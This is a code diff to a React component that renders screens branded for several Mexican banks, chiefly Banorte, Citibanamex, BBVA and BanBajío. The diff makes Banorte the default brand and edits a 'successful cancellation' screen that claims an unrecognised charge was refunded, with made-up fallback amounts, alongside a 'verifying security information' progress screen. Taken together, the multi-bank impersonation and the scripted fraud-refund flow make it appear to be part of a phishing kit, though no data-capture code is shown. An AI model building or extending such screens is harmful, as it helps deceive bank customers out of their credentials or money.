@@ -54,6 +54,20 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             {children}
           </div>
         );
+      } else if (banco === 'BANORTE') {
+        // Para Banorte no incluimos el logo aquí porque ya está en el header
+        return (
+          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
+            <div className="fecha-banorte mt-2 mb-4">
+              {new Date().toLocaleDateString('es-MX', {
+                day: 'numeric',
+                month: 'long',
+                year: 'numeric'
+              })}
+            </div>
+            {children}
+          </div>
+        );
       } else if (banco === 'CITIBANAMEX') {
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
@@ -62,13 +76,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </div>
         );
       } else if (banco === 'BBVA') {
-        return (
-          <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
-            {bankLogo()}
-            {children}
-          </div>
-        );
-      } else if (banco === 'BANORTE') {
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center">
             {bankLogo()}
@@ -327,8 +334,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <h2 className="text-xl font-bold mb-3">Cancelación exitosa</h2>
             <p className="mb-3">Hemos cancelado su cargo no reconocido de forma exitosa.</p>
             <div className="p-4 bg-gray-100 rounded mb-4 text-left">
-              <p><strong>Comercio:</strong> <span>{screenData.comercio || "Tienda en línea"}</span></p>
-              <p><strong>Monto devuelto:</strong> <span>{screenData.monto ? `$${screenData.monto}` : "$6,262"}</span></p>
+              <p><strong>Comercio:</strong> <span>{screenData.comercio || "Tienda departamental"}</span></p>
+              <p><strong>Monto devuelto:</strong> <span>{screenData.monto ? `$${screenData.monto}` : "$4,520"}</span></p>
             </div>
             <p className="mb-4">El monto estará disponible en su tarjeta dentro de 72 horas.</p>
             <Button 
@@ -368,8 +375,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 banco === 'BANBAJIO' ? 'banbajio-bg' : 
                 banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
                 banco === 'BBVA' ? 'bg-[#072146]' :
-                banco === 'BANORTE' ? 'bg-[#EC1C24]' :
-                'bg-[#e10098]'
+                'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
             <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
@@ -400,7 +406,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'BANORTE':
         return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       default:
-        return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
+        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
     }
   };
 
@@ -419,7 +425,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           <img src={banorteLogoGrande} alt="Banorte" className="banorte-logo h-14 mx-auto" style={{filter: 'brightness(0) invert(1)'}} />
         </div>;
       default:
-        return <img src={banorteLogo} alt="Banorte" className="h-16 mx-auto mb-4" />;
+        return <div className="banorte-header">
+          <img src={banorteLogoGrande} alt="Banorte" className="banorte-logo h-14 mx-auto" style={{filter: 'brightness(0) invert(1)'}} />
+        </div>;
     }
   };
 
